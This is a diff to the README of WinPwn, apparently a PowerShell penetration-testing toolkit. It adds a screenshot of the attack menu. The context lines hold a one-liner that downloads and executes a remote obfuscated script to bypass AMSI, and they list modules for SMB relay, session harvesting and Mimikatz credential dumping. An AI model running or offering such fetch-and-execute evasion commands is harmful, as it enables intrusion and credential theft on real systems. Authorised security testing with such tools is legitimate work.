@@ -14,7 +14,8 @@ For AMSI Bypass use the following oneliner:
 `iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/ObfusWinPwn.ps1')`
 
 Functions available after Import:
-* #### `WinPwn` -> Guides the user through all functions/Modules with simple questions.
+* #### `WinPwn` -> Menu to choose attacks:
+![alt text](https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn.JPG)
 * #### `Inveigh` -> Executes Inveigh in a new Console window , SMB-Relay attacks with Session management (Invoke-TheHash) integrated
 * #### `sessionGopher` -> Executes Sessiongopher Asking you for parameters
 * #### `Mimikatzlocal` -> Executes Invoke-WCMDump and Invoke-Mimikatz
